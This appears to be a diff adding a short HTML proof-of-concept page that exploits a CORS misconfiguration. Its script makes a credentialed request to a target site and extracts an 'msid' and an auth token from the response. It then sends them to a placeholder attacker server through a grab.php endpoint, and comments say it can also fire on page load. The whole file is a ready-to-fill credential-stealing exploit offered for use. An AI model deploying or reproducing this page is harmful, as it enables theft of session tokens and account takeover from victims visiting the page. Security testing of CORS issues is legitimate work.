@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h1>poc exp </h1>
+
+<div id="demo">
+<button type="button" onclick="cors()">exploit</button> <!-- or u can use onload= -->
+</div>
+
+<script>
+function cors() {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            document.getElementById("demo").innerHTML =this.responseText;
+                {
+                    var str=this.responseText;
+                    var n=str.search("msid");
+                    var c=str.substring(n+28,n+62);
+                    var b=str.search("auth:");
+                    var d=str.substring(b+23,b+525);
+                    var url = "_{YOUR_SERVER}_/grab.php?c=" + encodeURIComponent(c)+ encodeURIComponent(d); /*server link where the extactes msid or what ever info is need to be go */
+                    xhttp.open("GET", url, true);
+                    xhttp.send();
+}
+        }
+    };
+    xhttp.open("GET", "https://example.com/upload", true); /* enter your url here with cors issue */
+    xhttp.withCredentials = true;
+    xhttp.send();
+}
+</script>
+
+</body>
+</html>
